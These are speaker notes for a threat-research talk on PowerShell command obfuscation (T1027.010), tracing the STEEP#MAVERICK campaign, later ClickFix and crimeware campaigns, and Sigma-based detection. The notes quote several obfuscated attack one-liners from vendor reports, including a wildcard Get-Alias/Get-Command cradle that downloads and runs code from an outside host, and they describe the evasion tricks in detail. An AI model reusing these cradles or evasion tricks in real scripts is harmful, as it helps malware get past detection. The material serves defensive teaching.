# Speaker Notes — "An Obfuscated Tale: From ATT&CK Origin to Detection Today"

**Speaker:** Tim Peck, Director of Threat Research, detections.ai
**Total structured talk time: 30 minutes** (plus one genuinely-extra ~30 sec bonus
slide near the end, see Slide 34's own note). Slide numbers below match the on-screen
counter in `presentation.html` exactly (bottom-right of every slide, "N / 36"). Press
`#` + slide number in the address-bar-style hash, or just arrow through — either lands
on the numbering used here.

This document is written to be rehearsed from standalone — every slide's full spoken
content is below, in deck order, with cumulative timing checkpoints per section pulled
directly from the approved source guides. Where a line is marked **(verbatim source)**
it is reproduced exactly from the fact-checked guide content; nothing factual has been
altered in condensing it onto this page.

---

## Section timing budget (load-bearing — matches the master brief)

| Section | Slides | Budget | Cumulative |
|---|---|---|---|
| 0. Title (pre-talk / walk-on) | 1 | untimed | — |
| 1. Intro | 2 | 2:00 | 2:00 |
| 2. STEEP#MAVERICK: The Campaign | 3–10 (+divider 3) | 7:00 | 9:00 |
| 3. T1027.010: Command Obfuscation | 11–15 (+divider) | 4:00 | 13:00 |
| 4. Still Alive: 2025–2026 | 16–21 (+divider) | 5:00 | 18:00 |
| 5+6. Telemetry Problem + Detection Demo | 22–30 (+divider) | 10:00 | 28:00 |
| 7. Closing & Takeaways | 31–33 | 2:00 | 30:00 |
| GlobWarden (bonus, genuinely extra) | 34 | ~0:30 | 30:30 |
| Pull quote (silent beat) | 35 | untimed | — |
| Thank you / applause beat | 36 | untimed | — |

Section-divider slides (3, 11, 16, 22) carry the transition line already spoken at the
end of the previous slide's notes — they cost no *additional* time in the budget above;
say the line, advance, keep talking. This is flagged explicitly in `BUILD-NOTES.md` as
the one timing simplification a rehearsal should confirm feels natural out loud.

---

## Slide 1 — Title

*(Untimed — this is on screen while you're introduced / walking on. No speaking notes
required; let it sit.)*

---

## Slide 2 — Intro: Tim Peck

**Section 1 — Intro. Target: 2:00 (script below runs ~1:30 at a measured pace — the
slack is intentional; let the pauses breathe rather than padding the script back out.
See the "why this framing" note in `guides/00-speaker-intro-bio.md` for the tone call
behind the trim.)**

> Hi, I'm Tim Peck. I'm Director of Threat Research at detections.ai, which is a
> polite way of saying I spend my days looking at telemetry that's trying very hard
> not to be looked at.
>
> A few years ago I was one of the researchers who pulled apart a campaign called
> STEEP#MAVERICK. We didn't get handed a sample and a write-up request — we found the
> thing live, and had to figure out, layer by layer, what it was actually doing before
> we could tell anyone else. Eight layers of PowerShell obfuscation stacked on top of
> each other, counter-forensics that tried to delete itself out from under us mid
> analysis, and a wildcard invocation pattern we genuinely couldn't find a name for in
> ATT&CK — because there wasn't one yet.
>
> So we wrote one. That research is what became **T1027.010: Command Obfuscation** —
> the sub-technique defenders now use to name this behavior. Everything in the next
> twenty-five minutes — the campaign, the technique, and why it still matters in 2026
> — is the story of how those two things are the same story.
>
> Let's go back to where it started.

*(Advance through the Section 2 divider — the line above IS the transition, no separate
beat needed.)*

---

## Slide 3 — Divider: STEEP#MAVERICK

Say the section title as you land on it if useful ("STEEP#MAVERICK — the campaign"),
then move immediately into Slide 4. No new content here; see Slide 2's closing line.

---

## Slide 4 — Cold Open: It Started With a Zip File

**Section 2 — STEEP#MAVERICK. Target for this slide: 0:45 (cumulative 0:45 into
Section 2).**

> This is where it starts — not with an exploit, not with anything clever. A
> spear-phish with a zip attachment, containing a shortcut file made to look like a
> PDF about company benefits. If you're a defense contractor actively hiring, that's a
> completely plausible email to receive. The initial access here is boring on purpose.
> What we're about to walk through — that's where the actual engineering investment
> went. I was part of the Securonix team that found and published this campaign;
> everything in this section is firsthand.

---

## Slide 5 — Not cmd.exe. Not powershell.exe. forfiles.exe.

**Target: 0:50 (cumulative 1:35).**

> Before we even get to the obfuscation, there's a small but deliberate trick: the
> shortcut doesn't launch cmd or PowerShell directly — it goes through forfiles.exe, a
> legitimate, signed Windows utility nobody thinks to watch. Then a renamed copy of
> PowerShell gets dropped as "AdobeAcrobatPDFReader." If your detection logic keys off
> of "powershell.exe launched by explorer.exe," this walks right past it. Keep this in
> mind — process lineage evasion is a running theme across every campaign we'll touch
> on today, including the 2025–2026 ones later in the talk.

---

## Slide 6 — Eight Layers Deep

**Target: 0:45 (cumulative 2:20).**

> Eight stages. Each one exists to decode, decompress, or de-obfuscate the next layer
> down — and each layer is obfuscated using a different technique, so you can't write
> one signature and catch the whole chain. Layers four through six literally repeat
> the same compression trick three times in a row — which sounds redundant until you
> realize most automated sandboxes give up unwrapping after one or two passes to save
> time. This campaign was built assuming an analyst — human or automated — would quit
> early. Let's look at what that unwrapping actually looks like.

---

## Slide 7 — [KEY VISUAL] Watching the Chain Unwrap

**Target: 1:45 (cumulative 4:05). This is the flagship visual of the whole deck —
protect its time if the section runs long elsewhere.**

> This is the part I want you to remember. Eight layers, each one only readable once
> the one before it has executed and decoded it in memory. There's no point where you
> can just open the file and read what it does — every layer is opaque until it runs.
> Layers four, five, and six are literally the same trick, back to back to back,
> because the attacker knew most automated analysis gives up after a pass or two. And
> layer seven — that's where things get genuinely hostile, which is the next slide.

*(The diagram builds itself in automatically over about a second and a half as the
slide becomes active — no clicking required. If presenting from a machine where the
CSS animation doesn't fire for any reason, the diagram still displays fully and
correctly at rest; nothing is hidden behind the animation.)*

---

## Slide 8 — If You're a Sandbox, It Fights Back

**Target: 1:00 (cumulative 5:05).**

> Most malware, when it detects a sandbox, just quietly exits. This one doesn't. If
> any of these checks trip — small screen resolution, low RAM, a fresh VM, or
> literally just having Process Monitor or a debugger running — it doesn't bail out
> politely. It kills your network adapters, locks down the firewall in both
> directions, and recursively deletes your user profile and every other drive letter
> it can reach, then forces a shutdown. This is aimed squarely at the analyst. If
> you're running an under-resourced detonation VM in production — small RAM
> allocation, default resolution — you can trip this for real. This is not a purely
> academic concern.

*(Stage direction, not scripted: bottom-right of this slide has a small QR/plug for
Obscurize, a friend's tool that does userland API hooking to cloak real hosts as
sandboxes or honeypots as real hardware — directly relevant to the checks/retaliation
behavior just covered. Don't spend spoken time on it; it's placed here because it's
thematically on-topic, not because it needs a pitch. Let it sit for anyone looking at
the slide.)*

---

## Slide 9 — Get-Alias '?e[?x]' — Zero Literal Cmdlet Names

**Target: 1:10 (cumulative 6:15). The centerpiece novel finding — protect this slide's
time alongside Slide 7 if the section runs long.**

> Here's the piece that didn't have a name yet. Get-Alias and Get-Command both support
> wildcard matching. Ask PowerShell for any alias matching question-mark, e,
> question-mark, x — on a stock system, there's exactly one match: iex, short for
> Invoke-Expression. So you call Get-Alias with that pattern, wrap it in the call
> operator, and you've just invoked Invoke-Expression without ever writing the word
> "Invoke-Expression" — or even "iex" — anywhere in your source. We saw this used the
> same way to call Remove-Item during the destructive cleanup on the previous slide.
> John Hammond later gave this the name "Globfuscation" when he demonstrated it
> publicly, referencing this exact campaign.

---

## Slide 10 — You Can't Signature a String That Was Never Written

**Target: 0:45 (cumulative 7:00 — Section 2 ends here). Includes a live-fact-check
hedge below — don't rush this beat, it's load-bearing for credibility.**

> Static signatures look for strings. There's no string here to find — "iex" only
> ever exists as a value resolved live, off the system's own alias table, never as
> source text an analyst or a scanner can read at rest. And Get-Alias, Get-Command —
> those are completely unremarkable cmdlets, used constantly by legitimate admin
> scripts. Nobody was treating a wildcard query against them as suspicious, because in
> 2022, nothing in ATT&CK described this as its own category of behavior. T1027
> existed, but it's about obfuscated files and information generally — it doesn't get
> you down to "obfuscated at the command level, via alias wildcard resolution." That
> gap is exactly what put me on the path to submitting T1027.010 — and I'll be
> straight with you: if you pull up that page on your phone right now, the citation
> list points to a different piece we published later, not this campaign by name.
> That's a fair thing to notice. What I can tell you firsthand is that this is the
> chain that put the gap in front of us and got me pulled onto the sub-technique.
> That's where we're going next.

*(This line is also the transition into the Section 3 divider — no separate beat.)*

---

## Slide 11 — Divider: T1027.010

Land on the section title, keep moving — Slide 10's closing line already did the
transition work.

---

## Slide 12 — T1027 Had No Room For This

**Section 3 — T1027.010. Target: 0:45 (cumulative 0:45 into Section 3). If time
pressure hits anywhere in this section, trim speaker-note detail here first — the gap
should already feel established coming out of Section 2's closing beat.**

> Set the gap up fast — this crowd doesn't need T1027 explained, they need the
> specific gap named. T1027 — Obfuscated Files or Information — covers exactly what
> its name says: files and payloads made hard to discover or analyze by encoding,
> encrypting, compressing. That's the artifact layer. What it does not give you is a
> way to say, precisely, "this is command-line text manipulated to defeat pattern
> matching" — aliases, wildcards, environment variables, string concatenation, the
> stuff we just walked through in the eight-layer chain. Before March 14, 2023, that
> had no ID of its own. You could gesture at T1027 and be technically correct, and
> still be too coarse to build a coverage matrix, a purple-team scope, or a Navigator
> heatmap that actually distinguishes "we have command obfuscation detection" from "we
> have packer detection." That ambiguity is the gap STEEP#MAVERICK research ran
> headfirst into.

---

## Slide 13 — Command Obfuscation

**Target: 1:00 (cumulative 1:45).**

> The quote at the top is the technique's core definition, verbatim from ATT&CK, not
> paraphrased: command-line obfuscation, making strings and patterns within commands
> and scripts harder to signature and analyze. The five-part breakdown under it is my
> own working taxonomy for teaching this, not MITRE's literal category list — worth
> being precise about, because "alias" doesn't even appear on the T1027.010 page
> itself (it's language from the parent T1027 page), and "wildcard" isn't MITRE's word
> at all — the page's own term is "globing." What MITRE's page does say directly is
> string splitting, casing, globing, escape characters, and environment-variable/token
> tricks. However you slice the taxonomy, every piece of it is something we saw
> directly in the eight-layer chain in the last section. This isn't a technique that
> was written in the abstract and happened to fit — the mapping is real, and it's also
> personal: I'm listed as a contributor on this technique page, alongside George
> Thomas and TruKno. This is the "origin story" part of the talk title.

---

## Slide 14 — Character Masking vs. Wildcard IEX

**Target: 1:30 (cumulative 3:15). Intentionally the longest slide in this section — the
technical core and "novel reveal" moment the brief calls for.**

> Two things the technique explicitly names that I want to show you in code, because
> reading about obfuscation and watching it is different. Left side: character
> masking — backtick splitting, since PowerShell's parser just consumes backticks
> inside a token; case randomization, since PowerShell is case-insensitive; Unicode
> homoglyphs, where that "o" in the third example isn't actually a Latin o, it's
> Cyrillic — looks identical to a human, completely different byte sequence to a
> string match. This class of trick, by the way — John Hammond's covered this
> publicly too, so if it looks familiar, that's why. Right side, and this is the
> centerpiece: the wildcard IEX pattern. Get-Alias and Get-Command both take
> wildcards, both return a resolved command object, and that object pipes straight
> into an invocation operator. So you can wildcard-match your way to Invoke-Expression
> or Invoke-RestMethod and invoke it without ever typing the name. This is the pattern
> STEEP#MAVERICK surfaced with — at the time — no home in ATT&CK; that's my own
> account of the research, not a claim the ATT&CK page states outright, but the
> technique's creation date and my own contributor credit on the page today line up
> with it. Now it has a home — this is alias-table abuse, wildcard/glob-based
> resolution, and pattern-matching evasion, three categories in the taxonomy from the
> last slide, in one line of PowerShell.

---

## Slide 15 — Before / After: What Changed for Detection

**Target: 0:45 (cumulative 4:00 — Section 3 ends here).**

> Bring it back to why this matters operationally, not just taxonomically. Before, if
> you wanted to say "we have obfuscated-PowerShell detection," you were pointing at
> T1027 — which also covers packed binaries and steganography and a dozen other
> things that have nothing to do with command-line text. Your coverage claim was
> fuzzy by construction. After T1027.010 existed, that same detection content can be
> mapped to a specific sub-technique ID, with a published detection strategy —
> DET0505 — and three named analytics behind it. That's not academic. When we build
> the detection rules later in this talk, every one of them gets mapped explicitly to
> T1027.010, and to parent T1027 for coverage-matrix completeness. That precision is
> only possible because the sub-technique exists. Next section: fast-forward to 2025
> and 2026 — same primitives, three different campaigns, three different wrappers.

*(Transition line already spoken — advance through the Section 4 divider.)*

---

## Slide 16 — Divider: Still Alive: 2025–2026

Land on the section title, keep moving.

---

## Slide 17 — Same Wildcard, New Flag (GreenCharlie)

**Section 4 — Still Alive: 2025–2026. Target: ~70 sec (cumulative 1:10 into Section
4).**

> GreenCharlie is Iranian, active since at least 2020, and by 2024 it's running the
> same con as STEEP#MAVERICK's wildcard IEX trick — just with a different malware
> name on the label. Picus Security's write-up on this campaign quotes a line that
> should look familiar: `&(gcm *v?k?-?x?re*).name $LastEx;`. That's Get-Command —
> aliased as gcm — fed a wildcard glob instead of a cmdlet name. The shell resolves
> the glob to whatever cmdlet matches, and that's what gets invoked. The literal
> string a signature would be written against never appears on the command line. This
> is the identical shape of trick from our eight-layer chain earlier — just three
> years later, in a different campaign, attributed to a different actor.
>
> There are three malware variants here — GORBLE, TAMECAT, POWERSTAR — chained as
> downloader, decrypter/executor, then C2 beacon. GORBLE goes one step further and
> swaps Invoke-Expression itself for .NET's ScriptBlock.Create() — different lever,
> same goal: don't let the signature-worthy string exist in the command. And the
> payload itself gets a two-step decode: standard base64, then a bitwise NOT flip on
> every byte — cheap, but it defeats anyone whose tooling only unwraps base64 and
> stops.
>
> One honesty note I want on the record: the outline for this talk frames GreenCharlie
> as having an APT42 overlap. The specific Picus report I'm citing here documents
> Iranian attribution but doesn't itself assert that overlap — so I'm not putting that
> claim on the slide as sourced fact.

---

## Slide 18 — A Confirmed Actor, A Suspected Sample (MuddyWater ClickFix)

**Target: ~70 sec (cumulative 2:20).**

> Two sources, two different confidence levels, and I want to be upfront about that
> split rather than blur it. Proofpoint has solid delivery-mechanics attribution:
> TA450 — tracked elsewhere as MuddyWater, Mango Sandstorm — ran a ClickFix campaign
> November 13 and 14, 2024 against at least 39 organizations, mostly Middle East.
> Fake "Microsoft security update" email, spoofed sender, Win+R paste, and the
> payload installs a legit RMM tool called Level for persistent access. That's
> confirmed MuddyWater tradecraft, and it's part of a bigger trend — Proofpoint also
> tracked Russia's APT28 and North Korea's Kimsuky independently picking up ClickFix
> in that same window. Separately — and I'm citing this from a different source on
> purpose, because Proofpoint's own article doesn't actually say it — the US/UK joint
> advisory AA22-055A from February 2022 is what ties MuddyWater to Iran's Ministry of
> Intelligence and Security: it calls MuddyWater "a subordinate element within" MOIS
> directly.
>
> For the actual obfuscated PowerShell content, though, the best available reporting
> is Fortinet's — a November 2025 writeup of a ClickFix-delivered, PowerShell-only RAT
> hitting Israeli organizations. And Fortinet says outright: this resembles
> MuddyWater, but they can't confirm it — could be an evolution of MuddyWater's
> playbook, could be someone else copying it. I'm citing it anyway because it's the
> best 2025 technical sample available, but the slide says "MuddyWater-style," not
> "MuddyWater." The obfuscation itself: three base64 strings concatenated together,
> compressed with GZip twice, the whole thing reversed twice, and URL-safe character
> swaps so the base64 alphabet doesn't even look like base64 to a naive regex.
> Notably — no alias or wildcard trick in this one. Different actor, different subset
> of the same five-category technique.

---

## Slide 19 — One Toolkit, Three Names (ClearFake / Amatera / SectopRAT)

**Target: ~75 sec (cumulative 3:35). This is the strongest single data point in the
section — protect its time.**

> This is the slide that makes the point hardest. Three separately-reported crimeware
> campaigns — ClearFake's loader (Expel), the Amatera Stealer chain (Blackpoint), and
> a SectopRAT campaign (Vega) — front-end with a ClickFix fake CAPTCHA, and ClearFake
> adds a twist: the next-stage payload is hosted on a public blockchain, BNB Smart
> Chain smart contracts, so there's no domain or IP to blocklist. Estimated 147 to 150
> thousand infected systems inferred from unique IDs recorded in that public
> contract, per Expel.
>
> The pasted command doesn't go straight to PowerShell — it goes through wscript.exe
> running SyncAppvPublishingServer.vbs, a legitimate, Microsoft-signed script that
> ships with Windows App-V. It has a command-injection point, and it launches
> PowerShell hidden. Quoting Blackpoint precisely here because the exact wording
> matters: execution "alter[s] the process ancestry from the more common...
> explorer.exe → powershell.exe chain." So the real tree is
> explorer-to-wscript-to-powershell — explorer.exe doesn't disappear, it's still the
> root, since this really did start from a Win+R paste. What breaks is the direct
> explorer-to-powershell edge, which is what most naive Win+R detection rules are
> actually keyed on. Getting this exact chain right matters — we're about to spend the
> next section reading Sysmon process-creation events, so I don't get to be sloppy
> about a process tree right before that.
>
> And here's the line, quoted directly out of Expel's reporting:
> `&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/...')`. gal is Get-Alias, wildcarded to
> resolve iex — Invoke-Expression. gcm is Get-Command, wildcarded to resolve
> Invoke-RestMethod. Neither sensitive cmdlet name is ever typed. Blackpoint's
> completely separate Amatera Stealer report documents the exact same two primitives,
> gal i*x and gcm *stM*, in the exact same form, in a different campaign. And Vega's
> SectopRAT report — a third, completely independent vendor — quotes the identical
> `&(gal i*x)(&(gcm *stM*) '...')` skeleton a third time, wrapped around a different
> payload URL. Three vendors, three payloads, one identical wildcard-alias skeleton.
> That's not coincidence — that's a shared loader or traffic-distribution toolkit
> getting reused or resold across crimeware operations. I'll say clearly: that
> "shared toolkit" read is my own connecting of the dots across these three reports,
> not something any one of them claims outright — but the identical code is directly
> sourced from all three, and you can check it yourself.

---

## Slide 20 — Wrapper vs. Primitive (comparison table)

**Target: ~65 sec (cumulative 4:40).**

> Read this left to right — the wrapper column is four years of delivery-side
> innovation: spearphish, to ClickFix, to blockchain-hosted payloads that survive
> blocklisting. Now look at the primitive column: two of these four rows are the same
> trick — wildcard Get-Alias/Get-Command resolution against Invoke-Expression — in a
> 2022 espionage campaign and a 2025–2026 crimeware toolkit that share nothing else.
> The technique didn't need to evolve because it still works. That's the whole
> argument for T1027.010 as a durable detection target over chasing IOCs campaign by
> campaign — which is where this talk goes next.

---

## Slide 21 — The wrapper evolved. The technique didn't. (punchline)

**Target: ~20 sec (cumulative 5:00 — Section 4 ends here). Pure transition, no new
claims.**

> If you're still hunting IOCs from a 2022 campaign, you're defending against a
> wrapper that's already gone stale. If you're detecting the pattern — wildcard
> alias/cmdlet resolution, stacked encoding, environment-variable reconstruction —
> you're covering GreenCharlie, MuddyWater-style ClickFix, and
> ClearFake/Amatera/SectopRAT with the same rule. But none of that works without the
> right telemetry to see it happen in the first place. Which is where we go next.

*(Transition already spoken — advance through the Section 5+6 divider.)*

---

## Slide 22 — Divider: The Telemetry Problem & Detection Engineering

Land on the section title and the closing-line quote, keep moving.

---

## Slide 23 — T1027.010 Is Invisible By Default

**Section 5 — The Telemetry Problem. Target: ~30 sec (cumulative 0:30 into Section
5). Keep this brief — it's a bridge, not content.**

> Land the transition hard — this is the pivot from "here's the technique and why it
> matters" to "here's what you personally do about it Monday morning." Say
> explicitly: everything in the last three sections — the eight layers, the wildcard
> trick, GreenCharlie, MuddyWater, ClearFake — is invisible to your SOC by default.
> Windows does not log any of it out of the box. That's not a threat-intel problem,
> it's a telemetry problem, and it's the one the rest of the talk fixes. Introduce the
> three sources by number only here — you'll spend the next slide showing what each
> looks like in practice.

---

## Slide 24 — Same Attack. Two Endpoints. [DIAGRAM]

**Target: ~2:15 combined (cumulative 2:45). This slide merges the source material's
separate "uninstrumented" and "instrumented" beats into one side-by-side diagram —
narrate it as two halves, left then right, using the full combined time below.**

> Left half first. This is the "before." Most rooms will have people who assume 4688
> covers this — correct them directly: 4688 requires "Audit Process Creation" AND the
> separate "Include command line in process creation events" policy, and even then
> it's Security-log noise most environments don't tune well. Point at the blank
> "Process Command Line: -" line and let it sit for a second — that's the whole
> point. Nothing about the wildcard trick, the character masking, none of it, was
> ever written anywhere on this host. This is the default posture of a lot of
> production Windows fleets, not a hypothetical worst case. A SIEM search for
> "Invoke-Expression" on this host returns zero hits — not because it didn't happen,
> because nothing captured it.
>
> Now the right half — same attack, same host, same two seconds of wall clock, three
> sources enabled. Walk the triple: Sysmon event 1 gives you the full command line
> and the parent process; PowerShell 4104 gives you the parser's own resolved view —
> the wildcard exposed; 4103 gives you the cmdlets actually bound and their
> parameters. The point of this slide is the shape of the win: three independent data
> sources, same timestamp, same host, same process, each showing you a different
> layer of the same event. Emphasize "correlated" — this is what lets a Sigma rule on
> ScriptBlockText hand off to a process tree pivot on Sysmon without any manual
> reconstruction. This is the slide that earns the "reason to post about it" — the
> before/after image is the visual moment.

---

## Slide 25 — Three Sources, Three Jobs (reference card)

**Target: ~1:15 (cumulative 4:00 — Section 5 ends here).**

> This is the reference-card slide — it's the one people photograph. Say the one-liner
> for each row exactly as it reads, don't ad-lib past it, the room needs to be able to
> read it faster than you talk. Close with the thesis of this section: no single
> source is enough — Script Block Logging is richest but PowerShell-engine-specific
> and attacker-disableable; Sysmon is engine-agnostic ground truth but doesn't see
> inside the interpreter; module logging is the cross-check that catches the gap
> between the two. That's the whole argument for "all three, not one."

---

## Slide 26 — DEMO START: Raw 4104 — Wildcard Get-Alias → IEX

**Section 6 — Detection Engineering Demo. Target: ~1:15 (cumulative 1:15 into Section
6).**

> This is Section 6 start — announce the shift explicitly: "everything from here is
> pre-captured lab telemetry, reproducing the STEEP#MAVERICK pattern with placeholder
> infrastructure, not a live attack." Read the script block text aloud slowly once.
> Then decode it live, verbally, exactly like you did earlier for the campaign chain:
> gal is Get-Alias, ?e[?x] wildcard-resolves to iex, the inner (gal ?rm) resolves irm
> — Invoke-RestMethod — the same way. Net effect: download and execute, with neither
> cmdlet name ever typed. This callback is deliberate — say "same pattern you saw
> earlier, this time it's sitting in your log pipeline instead of a decompiled
> sample."
>
> **Demo action:** show `detection/sample-4104-logs/01-wildcard-getalias-iex.log` on
> screen (full-file `cat` or a pre-staged log-viewer screenshot). This file is
> intentionally raw-log-only — the analyst notes live in a separate paired file — so
> showing the whole thing on stage is safe and never spoils the answer early.
> Highlight `gal`, `?e[?x]`, `(gal ?rm)` in sequence as you narrate the decode. Only
> open the notes file after the rule is built on the next slide, if at all — let the
> room derive the logic themselves first.

---

## Slide 27 — DEMO: Building the Rule

**Target: ~1:30 (cumulative 2:45).**

> Build this incrementally on screen if your rehearsal time allows — type the first
> selection block, pause, ask the room "what's this alone going to false-positive on?"
> (answer: any legitimate alias enumeration script), then add the second selection and
> the AND condition, and make the point live: two weak signals, ANDed, is a strong
> signal. This is the pedagogical core of the demo — you're not just showing a
> finished rule, you're showing why it's shaped the way it is.
>
> Call out the backslash-escaping explicitly — it's a genuine gotcha and this room
> will appreciate seeing it named rather than glossed over: in Sigma's own detection
> syntax, `?` and `*` inside a value are wildcard operators, not literal characters —
> meaning an unescaped `?rm` doesn't mean "the literal text question-mark-r-m," it
> means "any char, then r, then m," which matches almost any script block that
> mentions the letters r and m near each other. Since the attacker's own source text
> uses `?` as PowerShell's wildcard character, and Sigma also uses `?` as its wildcard
> character, writing this rule means escaping the attacker's wildcard as a literal
> (`\?`) so Sigma doesn't re-interpret it as its own. Land on: this exact rule is
> `detection/sigma-rules/sigma-t1027010-wildcard-alias-iex.yml` in the takeaway kit,
> tagged `attack.t1027.010` and `attack.t1027`, and it's been validated both against
> the sample logs in the kit and by converting it through real Sigma backends (Splunk
> SPL, Lucene) to confirm the escaped values render as literal characters, not
> broadened wildcards — nobody in the room has to take it on faith.
>
> **Demo action:** if live-typing, build the YAML incrementally as scripted above. If
> using a static reveal instead (safer for time budget), reveal the two selection
> blocks and the condition line as separate beats timed to the narration above. Either
> way, don't improvise the regex/contains values live — they're pre-validated against
> the sample corpus.

---

## Slide 28 — DEMO: Character Masking (Because Hammond Did)

**Target: ~1:15 (cumulative 4:00).**

> Deliver the "because Hammond did" line as the in-community nod the brief calls for
> — a half-beat, no over-explanation, the room that knows will grin and move on. Then
> make the free-detection point explicitly and slowly, because it's a genuinely
> useful and slightly counterintuitive takeaway: Sigma's field matching is
> case-insensitive by default, so the entire case-randomization sub-technique
> (fOrfIlEs, pOwErShElL) requires zero extra rule logic — it's already defeated by the
> tooling everyone in the room already runs. What you do have to write logic for is
> the backtick-splitting and the concatenation, because those change the literal byte
> sequence, not just its case. Show the three techniques stacked in one sample script
> block (`detection/sample-4104-logs/02-character-masking-backtick-case.log`) — that's
> realistic, STEEP#MAVERICK stacked multiple sub-techniques in single layers, not
> one-per-layer.
>
> **Demo action:** open the sample log, scroll to the first ScriptBlockText block.
> Point out the three techniques inline as listed on the slide. Optionally flash
> `detection/sigma-rules/sigma-t1027010-character-masking.yml`'s
> `selection_backtick_iex` and `selection_string_concat_keyword` blocks for two
> seconds — don't build this one live, say "same construction method as the last one,
> it's in the kit."

---

## Slide 29 — DEMO: Tying It to Process Context [DIAGRAM]

**Target: ~1:15 (cumulative 5:15).**

> Close the demo by zooming back out from the single rule to the full kit: four Sigma
> rules (wildcard alias/command dispatch, character masking, env-var/path wildcard
> masking, reversed-string decode chain) validated against four sample logs
> reproducing distinct STEEP#MAVERICK-style patterns, every rule mapped explicitly to
> both T1027.010 and its parent T1027 in the tags field so it rolls up correctly in
> whatever ATT&CK Navigator or coverage dashboard the room already runs. Point at the
> diagram's Sysmon entry one more time and make the correlation point explicit: the
> Sigma rule fired on ScriptBlockText, but the Sysmon event is what gives you the
> parent process — Invoice_ref88213.exe, the phishing lure from Section 2 — for free,
> in the same pivot. That's the full stack working together, not three siloed data
> sources.
>
> **Demo action:** give the diagram a real few seconds of silence while it's on
> screen rather than talking over it — this is the "aha" correlation moment.

---

## Slide 30 — The Fuel Is the Whole Game

**Target: ~45 sec (cumulative 6:00 — bridge into Section 7, and end of the 10:00
Section 5+6 budget).**

> Short, declarative close — this is the exact bridge into the closing section's
> "three things to do this week" list, so don't pre-empt that content, just set it
> up. Repeat the thesis line one more time if it hasn't already landed: detection
> engineering is only as viable as the fuel you give it. Everything in `detection/` in
> the takeaway kit — the Sysmon config, the four Sigma rules, the four sample logs —
> is worthless on an endpoint that isn't instrumented. That's the whole point of
> putting this section before the closing takeaways instead of after: the technical
> payoff has to land before you ask the room to commit to doing anything about it.

*(No section-30 divider slide in the deck — this slide's own closing line carries the
transition directly into Section 7 content.)*

---

## Slide 31 — Active Tradecraft. Invisible Without the Right Stack.

**Section 7 — Closing & Takeaways. Target: ~35 sec (cumulative 0:35 into Section 7).**

> Bring it all the way back around in one breath. T1027.010 is not a museum piece —
> it's running today, right now, across the full spectrum of who you'd worry about:
> nation-state espionage in GreenCharlie, suspected state-linked ClickFix operations
> in the MuddyWater-style sample, and pure commodity crimeware in
> ClearFake/Amatera/SectopRAT. The wildcard alias trick we opened with — the one that
> didn't have a name in 2022 — is, primitive for primitive, the same trick shipping
> in a crimeware toolkit today. And none of it — not one layer of it — shows up
> anywhere in your environment unless 4104, 4103, and Sysmon 1/7/17 are actually
> turned on and correlated. That's not a caveat on today's talk. That's the whole
> talk.

---

## Slide 32 — Three Things to Do This Week

**Target: ~45 sec (cumulative 1:20).**

> This is deliberately the same three items the brief asked for, and deliberately in
> the order you'd actually do them — Day 1 is the highest-leverage, lowest-effort
> move: turn on Script Block Logging and Module Logging in the same GPO node, it
> costs you one trip through Group Policy. Days two and three, deploy the Sysmon
> config that's already in the kit — you don't have to write the XML, it's tuned and
> ready, `detection/sysmon-config-t1027010.xml`. Days four and five, and this is the
> one people skip: validate that your SIEM is actually receiving what you just turned
> on. "The GPO applied" is not the same claim as "my SIEM can see it" — the guide has
> the exact KQL and SPL queries to prove it, and if you get zero rows, that's an
> ingestion problem, not a rule problem, so fix that before you touch a single Sigma
> rule. Do this in order. Day 4–5 validation is meaningless without Day 1–3 actually
> deployed first.

---

## Slide 33 — What You're Leaving With

**Target: ~25 sec (cumulative 1:45). The deliberate "photograph this" moment — let it
sit for a beat before advancing.**

> This is what's actually in the kit, not a slide of promises — and it's all up on
> GitHub right now, QR code's right there. Six markdown guides covering everything we
> walked through today, in more depth than 30 minutes allows — the full STEEP#MAVERICK
> write-up, the T1027.010 technique reference, the 2025–2026 campaign briefing, the
> telemetry and detection guide, a character-masking and wildcard-IEX cheat sheet dense
> enough to be worth photographing on its own, and the one-week checklist you just saw
> condensed. Four Sigma rules, already mapped to T1027.010 and T1027, plus the tuned
> Sysmon config and the four sample logs you watched fire during the demo — all of it
> ready to drop straight into your own repo. And a real, runnable Python tool — zero
> dependencies, standard library only, never executes anything it scans, just flags the
> same four families of obfuscation we covered today. Take a picture. It's all real,
> it's all yours.

*(Stage direction: the QR/repo banner at the top of this slide links to
`github.com/bobby-tablez/ATT-CKcon-7.0` — this repo also gets updated if the deck
changes after the talk, so it's worth mentioning it's not a one-time snapshot. Keep
the verbal mention to the one line already in the script above; don't add more, the
slide and the "take a picture" beat do the rest of the work.)*

---

## Slide 34 — GlobWarden (bonus, "one more thing")

**~30 sec, not part of the official 30:00 clock — this is genuinely extra content
added after the core talk was finalized, not absorbed into existing slack like the
pull-quote beat below. Be honest with yourself in rehearsal about whether it fits;
if the talk is running long, this is the first thing to cut, the same way
FROZEN#SHADOW/DEEP#DRIVE was flagged as the first cut in the intro section — say
"link's in the slides" and move on, or skip the slide's spoken content entirely and
just let it sit on screen for a few seconds during applause/transition.**

> One more thing before we close. Everything in this talk came out of doing this by
> hand — reading a report, spotting the pattern, writing a rule in whatever language
> your SIEM speaks. I got tired of doing that manually, so I built a tool that does
> it for you. Point it at a report — a URL, a PDF, raw text, even a screenshot — and
> it reads it the way we just did, using whatever LLM you trust, including a fully
> offline local model if you can't send threat intel to a cloud API, and hands back
> regex, KQL, SPL, YARA-L, and Sigma in one pass — every rule checked before it ever
> shows you. It's called GlobWarden. It's open source, today. QR code's right there.

*(Advance into Slide 35 — the pull-quote beat — immediately after. No separate
transition line needed; "QR code's right there" is the exit.)*

---

## Slide 35 — Pull Quote: "The Fuel"

**Untimed silent beat — no new spoken content. Added as a standalone, decontextualized
"screenshot this" card; doesn't add net time to the 30:00 budget (Section 7's spoken
content already runs ~15 sec under its 2:00 target, which absorbs this beat — the
GlobWarden slide above is the one exception in this section that isn't absorbed,
see its own timing note).**

> Say nothing new here. Advance straight off the end of Slide 34's GlobWarden pitch,
> let this slide sit fully on screen in silence for a couple of seconds, then
> advance into Slide 36 and deliver the line aloud there as scripted. This slide exists
> only to give the talk's recurring thesis — already spoken on the Section 5+6 divider
> and on Slide 22, and about to close the talk on the next slide — one large, fully
> self-explanatory card with no surrounding text, so it reads as a complete, shareable
> unit to someone scrolling past a hallway photo without having heard the talk.

---

## Slide 36 — Thank You

**Untimed close — let the closing line land, take questions.**

> "Detection engineering is only as viable as the fuel you give it." That's the whole
> talk, and it's the line I want you to leave with. Thank you.

*(On screen: "Questions?" + name/role — deliberately no contact info or project list
